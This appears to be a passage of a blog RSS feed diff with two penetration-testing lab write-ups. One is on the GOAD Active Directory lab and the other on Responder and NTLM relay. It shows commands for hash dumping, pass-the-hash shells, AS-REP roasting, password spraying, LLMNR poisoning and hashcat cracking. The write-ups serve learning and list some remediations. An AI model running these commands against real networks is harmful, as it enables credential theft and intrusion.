+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image5.png&#34;
+	width=&#34;766&#34;
+	height=&#34;157&#34;
+	srcset=&#34;http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image5_hu15713556040192987483.png 480w, http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image5_hu12768770563393929339.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;using meterpreter to dump hashes&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;487&#34;
+		data-flex-basis=&#34;1170px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;From here, you can spawn a shell using evil-winrm with the Administrator hash.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image6.png&#34;
+	width=&#34;1101&#34;
+	height=&#34;218&#34;
+	srcset=&#34;http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image6_hu10856134132132352402.png 480w, http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image6_hu15234053413621800816.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;using evil-winrm to remote access the machine&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;505&#34;
+		data-flex-basis=&#34;1212px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Evil-winrm is good in the same way that meterpreter is helpful as it allows you to easily upload and download files. This can be useful when trying to get domain information using SharpHound to exfiltrate the zip that is generated.&lt;/p&gt;
+&lt;p&gt;I was having trouble doing this through Evil-WinRM, so we&amp;rsquo;ll move over to meterpreter with the nt authority privileges and attempt to run SharpHound that way.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image7.png&#34;
+	width=&#34;1543&#34;
+	height=&#34;510&#34;
+	srcset=&#34;http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image7_hu14070463673214676447.png 480w, http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image7_hu17346771357068749891.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;using SharpHound to enumerate the domain&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;302&#34;
+		data-flex-basis=&#34;726px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;And from here you can use meterpreter to download the zip file.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image8.png&#34;
+	width=&#34;1235&#34;
+	height=&#34;126&#34;
+	srcset=&#34;http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image8_hu2914436305173271639.png 480w, http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image8_hu3239327131353080161.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;using meterpreter to download sharphound zip file&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;980&#34;
+		data-flex-basis=&#34;2352px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;bloodhound&#34;&gt;BloodHound
+&lt;/h3&gt;&lt;p&gt;One great thing I like using BloodHound for is getting the users in the domain. You can also see what groups they&amp;rsquo;re a part of and ways you may be able to exploit their privileges.&lt;/p&gt;
+&lt;p&gt;The author of GOAD has a good tutorial on gathering users other ways, but those did not work for me, so going this route was much easier for me, especially with the Castelblack box being so vulnerable. You can view his walkthrough &lt;a class=&#34;link&#34; href=&#34;https://mayfly277.github.io/posts/GOADv2-pwning-part2/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;For me, I did the following query in BloodHound to view all the users.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;MATCH (u:User) RETURN u
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;And this was the result.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image9.png&#34;
+	width=&#34;1906&#34;
+	height=&#34;875&#34;
+	srcset=&#34;http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image9_hu2143932145989030627.png 480w, http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image9_hu1719818039209523258.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;users being displayed in bloodhound&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;217&#34;
+		data-flex-basis=&#34;522px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;From here, you can make a list of users. These we will use to test for credentials. In the GOAD guide, his methods of collecting user credentials were very useful.&lt;/p&gt;
+&lt;h3 id=&#34;credential-gathering&#34;&gt;Credential Gathering
+&lt;/h3&gt;&lt;p&gt;First, I made a list containing all the users we&amp;rsquo;ve captured.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image10.png&#34;
+	width=&#34;264&#34;
+	height=&#34;365&#34;
+	srcset=&#34;http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image10_hu894458065874602397.png 480w, http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image10_hu17707513776483341517.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image of user.txt file&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;72&#34;
+		data-flex-basis=&#34;173px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;You can also click through all the users in BloodHound and look at their privileges. Particularly, sometimes users will leave credentials in their descriptions. We find this with the samwell.tarly user.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image11.png&#34;
+	width=&#34;462&#34;
+	height=&#34;448&#34;
+	srcset=&#34;http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image11_hu18075759676135983452.png 480w, http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image11_hu4214800668469146469.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;user samwell.tarly having password in description&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;103&#34;
+		data-flex-basis=&#34;247px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;We can also check usernames as passwords.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;crackmapexec smb 192.168.74.11 -u users.txt -p users.txt --no-bruteforce --continue-on-success
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image12.png&#34;
+	width=&#34;1498&#34;
+	height=&#34;325&#34;
+	srcset=&#34;http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image12_hu3563041467773216095.png 480w, http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image12_hu12695700638234472659.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;checking for users using their username as thier password&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;460&#34;
+		data-flex-basis=&#34;1106px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Another way to get credentials that was suggested in the guide was to use GetNPUsers.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;impacket-GetNPUsers -usersfile users.txt -request -format hashcat -outputfile aspreroastables.txt -dc-ip 192.168.74.11 &amp;#39;north.sevenkingdoms.local/&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image13.png&#34;
+	width=&#34;1898&#34;
+	height=&#34;408&#34;
+	srcset=&#34;http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image13_hu17524711549465745187.png 480w, http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image13_hu2749505488518197694.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;using getnpusers to dump kerberos hashes&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;465&#34;
+		data-flex-basis=&#34;1116px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;This command generates a .txt file called &amp;lsquo;aspreroastables.txt&amp;rsquo; which you can run through hashcat to try and crack.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hashcat -m 18200 aspreroastables.txt /usr/share/wordlists/rockyou.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image14.png&#34;
+	width=&#34;1285&#34;
+	height=&#34;792&#34;
+	srcset=&#34;http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image14_hu1265579132568998943.png 480w, http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image14_hu9313923710402397754.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;using hashcat to crack hash dumped&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;162&#34;
+		data-flex-basis=&#34;389px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;We now should have four credentials:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image15.png&#34;
+	width=&#34;180&#34;
+	height=&#34;163&#34;
+	srcset=&#34;http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image15_hu7438753817952733884.png 480w, http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image15_hu9809159397793653376.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image of all the passwords collected so far&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;110&#34;
+		data-flex-basis=&#34;265px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;You can also perform a password spray with the users and passwords you&amp;rsquo;ve collected, but it looks like the passwords only match up with the people we found them for.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;crackmapexec smb 192.168.74.11 -u users.txt -p passwords.txt --continue-on-success
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image16.png&#34;
+	width=&#34;1210&#34;
+	height=&#34;791&#34;
+	srcset=&#34;http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image16_hu1193053282102765574.png 480w, http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image16_hu11490271401530542278.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image using crackmap to perform password spray&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;152&#34;
+		data-flex-basis=&#34;367px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;sources&#34;&gt;Sources
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.compass-security.com/2020/07/make-the-most-out-of-bloodhound/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://blog.compass-security.com/2020/07/make-the-most-out-of-bloodhound/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://mayfly277.github.io/posts/GOADv2-pwning-part2/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://mayfly277.github.io/posts/GOADv2-pwning-part2/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/itm4n/PrintSpoofer&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://github.com/itm4n/PrintSpoofer&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion
+&lt;/h2&gt;&lt;p&gt;This was just the first part of my exploration through Active Directory utilizing GOAD. In the coming writeups, I will be exploring getting into the other machines and moving around in the environment further.&lt;/p&gt;
+&lt;p&gt;Please leave a comment if you have any recommendations on things I could improve, or any thoughts on the process. Thank you for reading!&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Attacking Active Directory With Responder and NTLMrelayX</title>
+        <link>http://localhost:1313/p/attacking-active-directory-with-responder-and-ntlmrelayx/</link>
+        <pubDate>Fri, 17 Jan 2025 00:00:00 +0000</pubDate>
+        
+        <guid>http://localhost:1313/p/attacking-active-directory-with-responder-and-ntlmrelayx/</guid>
+        <description>&lt;img src="http://localhost:1313/p/attacking-active-directory-with-responder-and-ntlmrelayx/image1.png" alt="Featured image of post Attacking Active Directory With Responder and NTLMrelayX" /&gt;&lt;h2 id=&#34;description&#34;&gt;Description
+&lt;/h2&gt;&lt;p&gt;This project goes over the process of attacking an Active Directory environment. Remediation process for each attack are suggested as well.&lt;/p&gt;
+&lt;h2 id=&#34;utilities-used&#34;&gt;Utilities Used
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;responder&lt;/li&gt;
+&lt;li&gt;hashcat&lt;/li&gt;
+&lt;li&gt;impacket&lt;/li&gt;
+&lt;li&gt;evil-winrm&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;environment-used&#34;&gt;Environment Used
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;VMWare Workstation&lt;/li&gt;
+&lt;li&gt;Microsoft Windows Server 2022 Standard&lt;/li&gt;
+&lt;li&gt;x2 Microsoft Windows 10 Enterprise&lt;/li&gt;
+&lt;li&gt;Kali Linux with &lt;a class=&#34;link&#34; href=&#34;https://github.com/Dewalt-arch/pimpmykali&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;PimpMyKali&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;project-walkthrough&#34;&gt;Project Walkthrough
+&lt;/h2&gt;&lt;h3 id=&#34;setup&#34;&gt;Setup
+&lt;/h3&gt;&lt;p&gt;You must have an Active Directory Domain Controller and Windows 10 workstations set up in a particular way for these attacks to work properly. You can either follow &lt;a class=&#34;link&#34; href=&#34;https://www.youtube.com/watch?v=xftEuVQ7kY0&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;this&lt;/a&gt; YouTube video for instructions, or go through &lt;a class=&#34;link&#34; href=&#34;https://academy.tcm-sec.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;TCM Academy’s Practical Ethical Hacking&lt;/a&gt; course for proper instructions to get set up.&lt;/p&gt;
+&lt;p&gt;I also installed a Kali Linux machine that the attacks will be coming from. To ensure that you have everything communicating, make sure to change the NIC to NAT for all devices in the lab.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/attacking-active-directory-with-responder-and-ntlmrelayx/image.png&#34;
+	width=&#34;770&#34;
+	height=&#34;742&#34;
+	srcset=&#34;http://localhost:1313/p/attacking-active-directory-with-responder-and-ntlmrelayx/image_hu541003602711950912.png 480w, http://localhost:1313/p/attacking-active-directory-with-responder-and-ntlmrelayx/image_hu5110351976956320300.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;You need to go into the settings of your virtual machine to change this.&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;103&#34;
+		data-flex-basis=&#34;249px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;I also installed PimpMyKali onto the Kali box to add some extra features that will be used.&lt;/p&gt;
+&lt;p&gt;The tools you will need present on your Kali box are:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;responder&lt;/li&gt;
+&lt;li&gt;hashcat&lt;/li&gt;
+&lt;li&gt;impacket&lt;/li&gt;
+&lt;li&gt;evil-winrm&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;attacks&#34;&gt;Attacks
+&lt;/h2&gt;&lt;h3 id=&#34;nr-spoofing-leading-to-smb-credential-access&#34;&gt;NR Spoofing Leading to SMB Credential Access
+&lt;/h3&gt;&lt;p&gt;This is the most basic attack that can be performed with responder out of box. Essentially, all you need to do is run responder and wait for someone to attempt to connect to a non-existent SMB share.&lt;/p&gt;
+&lt;p&gt;You are essentially exploiting the broadcast performed between NBT-NS (NetBIOS Name Service), LLMNR (Link-Local Multicast Name Resolution), and mDNS (multicast DNS) by spoofing responses to their queries, tricking the victim into trusting the malicious server.&lt;/p&gt;
+&lt;p&gt;Because we have control over the workstations, we can simulate this event ourselves. This attack will cause the NTLMv2 hashes to be dumped, which we can take and crack.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;responder -I eth0 -dP -v
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/attacking-active-directory-with-responder-and-ntlmrelayx/image1.png&#34;
+	width=&#34;599&#34;
+	height=&#34;402&#34;
+	srcset=&#34;http://localhost:1313/p/attacking-active-directory-with-responder-and-ntlmrelayx/image1_hu8665747502234018022.png 480w, http://localhost:1313/p/attacking-active-directory-with-responder-and-ntlmrelayx/image1_hu7641434726893931978.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;This shows me running the command.&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;149&#34;
+		data-flex-basis=&#34;357px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Once you run responder, you need to go over to your Windows 10 workstation and attempt to access a fake SMB share.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/attacking-active-directory-with-responder-and-ntlmrelayx/image2.png&#34;
+	width=&#34;1147&#34;
+	height=&#34;605&#34;
+	srcset=&#34;http://localhost:1313/p/attacking-active-directory-with-responder-and-ntlmrelayx/image2_hu11040455925392250640.png 480w, http://localhost:1313/p/attacking-active-directory-with-responder-and-ntlmrelayx/image2_hu16035247352997422634.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;I just typed in \\fake into file explorer.&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;189&#34;
+		data-flex-basis=&#34;455px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;This should drop the NTLMv2 hash of the user who attempted the connection onto your Kali box with the listening responder tool.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/attacking-active-directory-with-responder-and-ntlmrelayx/image3.png&#34;
+	width=&#34;1696&#34;
+	height=&#34;308&#34;
+	srcset=&#34;http://localhost:1313/p/attacking-active-directory-with-responder-and-ntlmrelayx/image3_hu2081107371195551120.png 480w, http://localhost:1313/p/attacking-active-directory-with-responder-and-ntlmrelayx/image3_hu8826220879783261373.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;This shows responder dropping the NTLMv2 hash of the fcastle user.&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;550&#34;
+		data-flex-basis=&#34;1321px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;From here, you can put the hash into a text file and use hashcat to attempt to crack the password.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/attacking-active-directory-with-responder-and-ntlmrelayx/image4.png&#34;
+	width=&#34;1700&#34;
+	height=&#34;468&#34;
+	srcset=&#34;http://localhost:1313/p/attacking-active-directory-with-responder-and-ntlmrelayx/image4_hu15088337985485688939.png 480w, http://localhost:1313/p/attacking-active-directory-with-responder-and-ntlmrelayx/image4_hu11117333335762910878.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;This shows Hashcat cracking that users password&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;363&#34;
+		data-flex-basis=&#34;871px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h4 id=&#34;remediationmitigation&#34;&gt;Remediation/Mitigation
+&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;Disable LLMNR&lt;/li&gt;
+&lt;li&gt;Disable NBT-NS&lt;/li&gt;
+&lt;li&gt;Enable SMB Signing&lt;/li&gt;
+&lt;li&gt;Enforce Stronger Password Policies&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;sources&#34;&gt;Sources
+&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://academy.tcm-sec.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;TCM Academy Practical Ethical Hacking course&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.cynet.com/attack-techniques-hands-on/llmnr-nbt-ns-poisoning-and-credential-access-using-responder/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;CYNET - LLMNR &amp;amp; NBT-NS Poisoning and Credential Access using Responder&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;smb-relay-using-impacket-ntlmrelayx-and-responder&#34;&gt;SMB Relay Using Impacket-ntlmrelayx And Responder
+&lt;/h3&gt;&lt;p&gt;This attack can be performed utilizing both impacket-ntlmrelayx and responder in conjunction. It&amp;rsquo;s very similar to the NR spoofing attack, but allows us to relay the captured NTLM hash and authenticate as that user. This can allow us to dump SAM hashes or gain shell access.&lt;/p&gt;
+&lt;p&gt;For this attack to work, there needs to be multiple machines with SMB signing disabled. Make sure to include all of the machines in a target.txt file, or else the attack will not work [&lt;a class=&#34;link&#34; href=&#34;https://github.com/fortra/impacket/issues/1010&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;1&lt;/a&gt;]&lt;/p&gt;
+&lt;p&gt;You can test to see if SMB signing is enabled but not required by executing the following command:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nmap --script=smb2-security-mode.nse -p445 &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;ip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;You can also specify a range of IPs and scan for multiple vulnerable workstations.&lt;/p&gt;
+&lt;p&gt;Once you have all of the vulnerable workstations in a text document, you need to first run responder:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
